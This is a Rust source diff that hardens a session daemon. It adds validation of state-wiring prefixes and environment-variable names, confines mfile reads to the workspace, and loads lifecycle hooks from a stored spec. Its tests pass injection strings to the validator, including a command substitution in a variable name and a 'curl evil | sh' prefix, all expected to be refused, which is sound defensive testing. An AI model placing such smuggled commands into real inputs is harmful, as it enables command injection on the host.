@@ -30,7 +30,7 @@ use boxes::{
     SessionId,
     core::compose::ComposeOptions,
     daemon::composer::{ComposeOutcome, SessionComposer},
-    wire::request::WireContribution,
+    wire::request::{WireBoxEntry, WireContribution},
 };
 use graph::{EnvFsMapping, EnvMappingClass, EnvMappingKind};
 use paths::DaemonAbsPath;
@@ -78,26 +78,28 @@ fn extract_state_wiring(b: &graph::BuildSpec) -> Result<Vec<mfile::StateWiring>,
             Some(mfile::StateWiring { env_var, prefix })
         })
         .map(|w| {
-            // Multi-component prefixes (`foo/bar`) are unused by
-            // any package in `gominimal/pkgs` today. The composition
-            // path's state-dir derivation would silently drop them
-            // while the legacy `SetupForPackages` path would
-            // `mkdir -p` them — a task-vs-session divergence for
-            // the same nickel entry. Reject at extraction so the
-            // divergence never gets exercised; if a package
-            // legitimately needs this shape, both branches will
-            // need to agree on how to handle it and this check can
-            // relax then.
-            if w.prefix.contains('/') {
+            // The prefix is joined onto the state dir and sent to the shell
+            // helpers, so it has to be one directory name. The same rule
+            // (`mfile::is_state_prefix`) and the same text guard the task
+            // path in `graph::SetupForPackages`. It holds for any spec, also
+            // one that no Nickel contract has checked.
+            if !mfile::is_state_prefix(&w.prefix) {
                 return Err(std::io::Error::new(
                     std::io::ErrorKind::InvalidData,
-                    format!(
-                        "package `{}` declares `env_state_wiring` with prefix `{}` \
-                         containing '/'; multi-component prefixes are not supported \
-                         on the session composition path. Split into a single \
-                         component or open an issue if you need this shape.",
-                        b.name, w.prefix,
-                    ),
+                    mfile::state_prefix_refusal(&b.name, &w.prefix),
+                ));
+            }
+            // The composition path exports the same names to the session
+            // shell that the task path does; a non-identifier name would
+            // be evaluated by the helper's `set_env` branch (bash runs
+            // array-subscript arithmetic inside a `declare`d name). The
+            // nickel contract rejects such a name at parse time; this
+            // re-check covers specs that arrive without it, with the
+            // graph's text.
+            if !graph::is_valid_env_var_name(&w.env_var) {
+                return Err(std::io::Error::new(
+                    std::io::ErrorKind::InvalidData,
+                    graph::env_var_refusal(&b.name, &w.env_var),
                 ));
             }
             Ok(w)
@@ -226,8 +228,11 @@ pub(crate) fn resolve_project_ctx_and_graph(
     // `packages/*.ncl`, `stacks/*.ncl`, and `profiles/*.ncl` all
     // contribute to graph construction and have to be on disk when
     // this runs.
+    //
+    // The box controls that tree, so the mfile is read beneath it: a
+    // `minimal.toml` that links out of the workspace is refused.
     let project_path_std = project_path.as_utf8_path().as_std_path().to_path_buf();
-    let mfile = match mctx::MFileSearchStrategy::Override(project_path_std).find_mfile() {
+    let mfile = match mctx::MFileSearchStrategy::Within(project_path_std.clone()).find_mfile() {
         Ok(m) => m,
         Err(mctx::Error::MFile(mfile::Error::NotFound)) => {
             tracing::debug!(
@@ -244,6 +249,7 @@ pub(crate) fn resolve_project_ctx_and_graph(
         }
     };
     let mut ctx = mctx::Context::from_daemon(Arc::clone(daemon_ctx), mfile);
+    ctx.confine_mfile_edits_to(project_path_std);
     let graph = {
         let _g = tracing::info_span!("compose.graph_from_all_packages").entered();
         ctx.graph_from_all_packages()
@@ -505,6 +511,16 @@ pub(crate) fn build_composables(
     Ok((project_composable, package_composables))
 }
 
+/// What [`run_compose`] learned about the compose-time graph for the
+/// finalize-time package check.
+#[derive(Debug)]
+pub(crate) struct ComposedGraph {
+    /// The package names the graph declared.
+    pub(crate) names: std::collections::HashSet<String>,
+    /// The project's `[upstream]` pin, if it has one.
+    pub(crate) pin: Option<crate::env::UpstreamPin>,
+}
+
 /// The full compose chain for a create flow: resolve the project,
 /// build its composables, and run the composer. Synchronous and
 /// potentially expensive (nickel evaluation, graph resolution) —
@@ -522,18 +538,22 @@ pub(crate) fn build_composables(
 /// among the most expensive steps of this chain, and the finalize-time
 /// package check asks the same question of the same workspace:
 /// handing the names back lets its caller answer from them instead of
-/// evaluating the graph a second time.
+/// evaluating the graph a second time. The project's `[upstream]` pin
+/// rides along, so that check can name the commit it judged against.
 pub(crate) fn run_compose(
     daemon_ctx: &Arc<mctx::DaemonContext>,
     project_path: &DaemonAbsPath,
     declared_path: &paths::HostAbsPath,
     contribution: WireContribution,
     hooks_enabled: bool,
-) -> Result<(ComposeOutcome, Option<std::collections::HashSet<String>>), std::io::Error> {
+) -> Result<(ComposeOutcome, Option<ComposedGraph>), std::io::Error> {
     let resolution = resolve_project_ctx_and_graph(daemon_ctx, project_path)?;
     let graph_names = match &resolution {
         ProjectResolution::NoMFile => None,
-        ProjectResolution::Full(_, graph) => Some(graph.names().map(str::to_owned).collect()),
+        ProjectResolution::Full(ctx, graph) => Some(ComposedGraph {
+            names: graph.names().map(str::to_owned).collect(),
+            pin: crate::env::UpstreamPin::of(ctx.minimal_file()),
+        }),
     };
     let (project_composable, package_composables) = build_composables(
         project_path,
@@ -542,8 +562,132 @@ pub(crate) fn run_compose(
         &contribution,
         hooks_enabled,
     )?;
+    let mut contribution = contribution;
+    if hooks_enabled && let Some(spec) = stored_spec_beside(project_path)? {
+        compose_hooks_from_stored_spec(&mut contribution, declared_path, &spec);
+    }
     let outcome = run_composer(contribution, project_composable, package_composables)?;
     Ok((outcome, graph_names))
+}
+
+/// The hooks of the spec stored beside a box's workspace, with the entry
+/// and the Box Type that the spec names (BOX-068, BOX-179).
+pub(crate) struct StoredHooks {
+    /// The spec's `entry`.
+    entry: String,
+    /// The spec's `box.type`.
+    box_type: String,
+    /// The spec's `lifecycle_hooks`, each with its `declared_by`.
+    hooks: Vec<mfile::spec::SpecHook>,
+}
+
+/// The hooks of the spec stored beside the box's workspace, `project_path`:
+/// the [`boxes::store::SPEC_FILE`] in the workspace's parent, the box's own
+/// directory (BOX-068). `None` when the box stores no spec, or a spec with
+/// no `lifecycle_hooks` key.
+///
+/// It reads only the keys the compose uses: `v`, `entry`, `box.type` and
+/// `lifecycle_hooks`. A stored spec also carries keys that other readers of
+/// the daemon read one at a time, such as `io.exec_enabled`,
+/// `[[file_exports]]` and `network.vpn_network_names`. A whole-spec parse
+/// refuses those keys, so it is not used here.
+///
+/// # Errors
+///
+/// A stored spec that exists but cannot be read fails the compose, so the
+/// box never runs hooks from a source other than its stored spec. A stored
+/// spec that is not JSON fails the compose with `InvalidInput`. So does a
+/// hook list in a spec that is not a v0 Box Spec, that names no `entry` or
+/// `box.type`, or that has a hook with no valid `declared_by`.
+fn stored_spec_beside(project_path: &DaemonAbsPath) -> Result<Option<StoredHooks>, std::io::Error> {
+    let Some(dir) = project_path.as_utf8_path().parent() else {
+        return Ok(None);
+    };
+    let path = dir.join(boxes::store::SPEC_FILE);
+    let bytes = match std::fs::read(&path) {
+        Ok(bytes) => bytes,
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
+        Err(e) => {
+            tracing::error!(spec_path = %path, error = %e, "could not read the stored box spec");
+            return Err(std::io::Error::new(
+                e.kind(),
+                format!("reading the stored box spec at {path}: {e}"),
+            ));
+        }
+    };
+    stored_hooks(&bytes).inspect_err(|e| {
+        tracing::error!(spec_path = %path, error = %e, "the stored box spec is refused");
+    })
+}
+
+/// The hooks of the stored spec `bytes`, as [`stored_spec_beside`] reads
+/// them.
+fn stored_hooks(bytes: &[u8]) -> Result<Option<StoredHooks>, std::io::Error> {
+    let refused = |why: String| std::io::Error::new(std::io::ErrorKind::InvalidInput, why);
+    let spec: serde_json_lenient::Value = serde_json_lenient::from_slice(bytes)
+        .map_err(|e| refused(format!("the stored box spec is not JSON: {e}")))?;
+    let Some(hooks) = spec.get("lifecycle_hooks") else {
+        return Ok(None);
+    };
+    let version = spec.get("v").and_then(serde_json_lenient::Value::as_u64);
+    if version != Some(u64::from(mfile::spec::BOX_SPEC_VERSION)) {
+        return Err(refused(format!(
+            "the stored box spec has lifecycle_hooks, and its version is not {}",
+            mfile::spec::BOX_SPEC_VERSION
+        )));
+    }
+    let text = |value: Option<&serde_json_lenient::Value>, key: &str| {
+        value
+            .and_then(serde_json_lenient::Value::as_str)
+            .map(str::to_owned)
+            .ok_or_else(|| {
+                refused(format!(
+                    "the stored box spec has lifecycle_hooks and no {key}"
+                ))
+            })
+    };
+    let entry = text(spec.get("entry"), "entry")?;
+    let box_type = text(spec.get("box").and_then(|b| b.get("type")), "box.type")?;
+    let hooks: Vec<mfile::spec::SpecHook> = serde_json_lenient::from_value(hooks.clone())
+        .map_err(|e| refused(format!("the stored box spec's lifecycle_hooks: {e}")))?;
+    Ok(Some(StoredHooks {
+        entry,
+        box_type,
+        hooks,
+    }))
+}
+
+/// Composes the project's lifecycle hooks from the stored spec's hooks,
+/// `stored`, not from the project's `minimal.toml` (BOX-068, BOX-179). The
+/// hooks whose `declared_by` names the project replace every project hook:
+/// the ones the daemon read from `[session]` and the ones the expanded
+/// entry sent. A loadout's hooks stay on the client's contribution, with
+/// their loadout, so the stored loadout hooks are not added a second time.
+pub(crate) fn compose_hooks_from_stored_spec(
+    contribution: &mut WireContribution,
+    declared_path: &paths::HostAbsPath,
+    stored: &StoredHooks,
+) {
+    let project: Vec<_> = stored
+        .hooks
+        .iter()
+        .filter(|h| h.declared_by == mfile::spec::HookDeclarer::Project)
+        .map(|h| h.hook.clone())
+        .collect();
+    tracing::info!(
+        entry = %stored.entry,
+        stored_hooks = stored.hooks.len(),
+        project_hooks = project.len(),
+        "compose: the project's lifecycle hooks come from the stored spec"
+    );
+    let entry = contribution.entry.get_or_insert_with(|| {
+        Box::new(WireBoxEntry::new(
+            &stored.entry,
+            &stored.box_type,
+            declared_path.clone().into(),
+        ))
+    });
+    entry.lifecycle_hooks = Some(project);
 }
 
 /// Assemble the [`SessionComposer`], `add()` the daemon-side
@@ -842,48 +986,101 @@ mod tests {
     }
 
     /// A package declaring `env_state_wiring` with a multi-component
-    /// `prefix` (e.g. `"cache/artifacts"`) is rejected at extraction
-    /// with a descriptive `InvalidData` error. Guards the
-    /// task-vs-session divergence — the legacy `SetupForPackages`
-    /// path would silently `mkdir -p` such a prefix, but the
-    /// composition path's state-dir derivation would drop it. Rather
-    /// than pick a behavior arbitrarily, fail loudly so a package
-    /// author sees the "novel schema shape not yet supported"
-    /// message.
+    /// `prefix` (e.g. `"cache/artifacts"`) never reaches the session: the
+    /// legacy `SetupForPackages` path would `mkdir -p` such a prefix, but
+    /// the composition path's state-dir derivation would drop it. The
+    /// `attrs` contract `BuildSpec` applies refuses it when the spec
+    /// loads, so the same spec with a one-name prefix is loaded first: a
+    /// load error for another reason cannot pass for the refusal. The
+    /// refusal's text is checked by `graph::env_setup`'s
+    /// `the_prefix_rule_and_the_contract_agree`; the extraction-time
+    /// check, for a spec no contract saw, by the test after this one.
     #[test]
     fn multi_component_state_wiring_prefix_errors() {
-        let layer = Layer::new_for_test(
-            indoc! {
-                "
-                let {BuildSpec, ..} = import \"minimal.ncl\" in
-                {
-                    name = \"bad\",
-                    build_deps = [],
-                    cmd = \"\",
-                    attrs.env_state_wiring = [
-                      { env_var = \"WEIRD\", prefix = \"cache/artifacts\" },
-                    ],
-                } | BuildSpec
-                "
-            }
-            .to_string(),
-        )
-        .unwrap_or_else(|e| {
+        let spec = |prefix: &str| {
+            format!(
+                "let {{BuildSpec, ..}} = import \"minimal.ncl\" in\n\
+                 {{ name = \"bad\", build_deps = [], cmd = \"\", \
+                 attrs.env_state_wiring = [{{ env_var = \"WEIRD\", prefix = \"{prefix}\" }}] }} \
+                 | BuildSpec\n"
+            )
+        };
+
+        let layer = Layer::new_for_test(spec("artifacts")).unwrap_or_else(|e| {
             e.report_to_stderr();
-            panic!("spec parsing failed");
+            panic!("the one-name prefix did not load, so the test proves nothing");
         });
         let g = graph::Graph::new().ingest(layer).unwrap();
         let bs = g.get(g.by_name("bad").unwrap()).unwrap();
+        assert_eq!(extract_package_attrs(bs).unwrap().state_wiring.len(), 1);
 
-        let err = extract_package_attrs(bs)
-            .expect_err("multi-component prefix should error at extraction");
-        assert_eq!(err.kind(), std::io::ErrorKind::InvalidData);
-        let msg = err.to_string();
-        assert!(msg.contains("bad"), "error should name the package: {msg}");
-        assert!(
-            msg.contains("cache/artifacts"),
-            "error should name the offending prefix: {msg}"
-        );
+        match Layer::new_for_test(spec("cache/artifacts")) {
+            Ok(_) => panic!("a multi-component prefix loaded"),
+            Err(decode::Error::Nickel(_)) => {}
+            Err(e) => {
+                e.report_to_stderr();
+                panic!("the prefix was refused by the reader, not the contract");
+            }
+        }
+    }
+
+    /// The composition path re-checks both fields of a wiring entry for a
+    /// spec that no Nickel contract has checked, such as one that arrives by
+    /// wire. The spec is built by hand, so these cases reach the check
+    /// whatever the contract does. Each refusal names the package, quotes
+    /// the value escaped onto one line, and uses the same text as the graph.
+    #[test]
+    fn a_wiring_entry_the_contract_never_saw_is_refused_at_composition() {
+        let spec = |env_var: &str, prefix: &str| {
+            let mut entry = decode::AttrValue::Map(Default::default());
+            if let decode::AttrValue::Map(m) = &mut entry {
+                m.insert(
+                    "env_var".to_string(),
+                    decode::AttrValue::String(env_var.to_string(), None),
+                );
+                m.insert(
+                    "prefix".to_string(),
+                    decode::AttrValue::String(prefix.to_string(), None),
+                );
+            }
+            // `BuildSpec` has a private field, so it is built from its default
+            let mut b = graph::BuildSpec::default();
+            b.attrs.insert("env_state_wiring".to_string(), entry);
+            b.name = "bad".into();
+            b
+        };
+
+        for (env_var, prefix, quoted) in [
+            (
+                "X[$(touch /tmp/pwned)]",
+                "gocache",
+                "\"X[$(touch /tmp/pwned)]\"",
+            ),
+            ("1A", "gocache", "\"1A\""),
+            ("A\nB", "gocache", "\"A\\nB\""),
+            ("GOCACHE", "..", "\"..\""),
+            ("GOCACHE", "cache/artifacts", "\"cache/artifacts\""),
+            ("GOCACHE", "cache:artifacts", "\"cache:artifacts\""),
+            ("GOCACHE", "x; curl evil | sh", "\"x; curl evil | sh\""),
+            ("GOCACHE", "a\u{1b}[2Jb", "\"a\\u{1b}[2Jb\""),
+        ] {
+            let b = spec(env_var, prefix);
+            let err = extract_package_attrs(&b).expect_err(quoted);
+            assert_eq!(err.kind(), std::io::ErrorKind::InvalidData, "{quoted}");
+            let msg = err.to_string();
+            assert!(msg.contains("`bad`"), "names the package: {msg}");
+            assert!(msg.contains(quoted), "quotes {quoted} escaped: {msg}");
+            assert!(!msg.contains(['\n', '\u{1b}']), "one line: {msg:?}");
+            let graph_text = if graph::is_valid_env_var_name(env_var) {
+                mfile::state_prefix_refusal("bad", prefix)
+            } else {
+                graph::env_var_refusal("bad", env_var)
+            };
+            assert_eq!(msg, graph_text, "the graph's text");
+        }
+
+        let ok = extract_package_attrs(&spec("GOCACHE", "gocache")).expect("a plain entry");
+        assert_eq!(ok.state_wiring.len(), 1);
     }
 
     /// BOX-068: when the client sends an expanded entry, the daemon
